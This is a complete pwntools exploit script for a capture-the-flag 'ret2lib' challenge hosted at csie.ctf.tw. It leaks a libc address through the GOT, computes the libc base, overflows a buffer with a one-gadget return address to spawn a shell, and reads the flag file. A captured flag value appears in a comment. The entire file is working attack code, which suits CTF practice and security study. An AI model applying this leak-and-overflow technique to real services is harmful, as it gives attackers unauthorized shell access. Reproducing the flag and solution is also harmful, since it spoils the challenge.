#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{O66cJwwT8lKl1oKhUG8DcwZxTSwnLaHu}

e , l = ELF('./ret2lib-8dae1f5fdb78457da8190155c8ea5643f5139991') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10127

y = remote(host,port)

y.sendafter( ':' , hex( e.got['__libc_start_main'] ) )

y.recvuntil( '0x' )
l.address += int( y.recvline().strip() , 16 ) - l.symbols['__libc_start_main']

y.sendlineafter( '?' , 'D' * 0x38 + p64( l.address + 0xf1117 ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

